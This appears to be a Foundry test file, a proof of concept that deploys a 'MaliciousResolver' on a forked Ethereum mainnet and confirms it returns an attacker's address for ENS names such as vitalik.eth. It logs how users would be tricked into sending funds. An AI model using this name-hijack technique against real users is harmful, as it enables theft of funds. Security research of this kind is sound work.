// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/MaliciousResolver.sol";

contract DeployMaliciousResolverTest is Test {
    // Mainnet addresses
    address constant MAINNET_ENS = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;
    address constant MAINNET_PUBLIC_RESOLVER = 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41;
    
    address attacker;
    MaliciousResolver basicResolver;
    
    function setUp() public {
        // Fork mainnet
        vm.createSelectFork("mainnet");
        
        // Set attacker address
        attacker = address(0x1337);
        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);
    }
    
    function testDeployBasicMaliciousResolver() public {
        console.log("=== DEPLOYING BASIC MALICIOUS RESOLVER ===");
        console.log("Attacker:", attacker);
        console.log("ENS Registry:", MAINNET_ENS);
        console.log("PublicResolver:", MAINNET_PUBLIC_RESOLVER);
        
        // Deploy basic malicious resolver
        basicResolver = new MaliciousResolver(
            attacker,
            address(0), // Use mainnet ENS
            address(0)  // Use mainnet PublicResolver
        );
        
        console.log("\nMaliciousResolver deployed at:", address(basicResolver));
        
        // Verify deployment
        console.log("\n=== VERIFICATION ===");
        console.log("ENS:", address(basicResolver.ens()));
        console.log("PublicResolver:", address(basicResolver.publicResolver()));
        console.log("Attacker:", basicResolver.attacker());
        
        // Verify addresses
        require(address(basicResolver.ens()) == MAINNET_ENS, "Wrong ENS address");
        require(address(basicResolver.publicResolver()) == MAINNET_PUBLIC_RESOLVER, "Wrong PublicResolver address");
        require(basicResolver.attacker() == attacker, "Wrong attacker address");
        
        // Test the attack
        console.log("\n=== TESTING MAN-IN-THE-MIDDLE ATTACK ===");
        bytes32 testNode = keccak256(abi.encodePacked(
            bytes32(0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae), // eth node
            keccak256("test")
        ));
        
        // Query PublicResolver for correct address (using the interface from MaliciousResolver)
        address correctAddress = address(0);
        (bool success, bytes memory data) = MAINNET_PUBLIC_RESOLVER.staticcall(
            abi.encodeWithSignature("addr(bytes32)", testNode)
        );
        if (success && data.length > 0) {
            correctAddress = abi.decode(data, (address));
        }
        console.log("PublicResolver addr() returns (CORRECT):", correctAddress);
        
        // Query malicious resolver
        address maliciousAddress = basicResolver.addr(testNode);
        console.log("MaliciousResolver addr() returns (MALICIOUS):", maliciousAddress);
        
        // Verify attack works
        require(maliciousAddress == attacker, "Attack failed - wrong address returned");
        console.log("\nATTACK SUCCESSFUL: Malicious resolver returns attacker address!");
        
        if (correctAddress != address(0) && correctAddress != attacker) {
            console.log("WARNING: User would send funds to attacker instead of correct address!");
            console.log("Correct address:", correctAddress);
            console.log("Malicious address:", maliciousAddress);
        }
        
        vm.stopPrank();
    }
    
    
    function testManInTheMiddleAttack() public {
        // Deploy resolver
        basicResolver = new MaliciousResolver(
            attacker,
            address(0),
            address(0)
        );
        
        console.log("=== MAN-IN-THE-MIDDLE ATTACK TEST ===");
        console.log("MaliciousResolver deployed at:", address(basicResolver));
        
        // Use a real ENS name for testing (if available on fork)
        bytes32 vitalikNode = keccak256(abi.encodePacked(
            bytes32(0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae),
            keccak256("vitalik")
        ));
        
        // Query real PublicResolver
        address publicResolverAddr = address(0);
        (bool success, bytes memory data) = MAINNET_PUBLIC_RESOLVER.staticcall(
            abi.encodeWithSignature("addr(bytes32)", vitalikNode)
        );
        if (success && data.length > 0) {
            publicResolverAddr = abi.decode(data, (address));
        }
        console.log("\nPublicResolver returns for vitalik.eth:", publicResolverAddr);
        
        // Query malicious resolver
        address maliciousAddr = basicResolver.addr(vitalikNode);
        console.log("MaliciousResolver returns for vitalik.eth:", maliciousAddr);
        
        // Verify attack
        require(maliciousAddr == attacker, "Attack failed");
        console.log("\nATTACK CONFIRMED: Malicious resolver intercepts and returns attacker address!");
        
        if (publicResolverAddr != address(0) && publicResolverAddr != attacker) {
            console.log("\nCRITICAL: User would send funds to attacker instead of:", publicResolverAddr);
        }
        
        vm.stopPrank();
    }
}
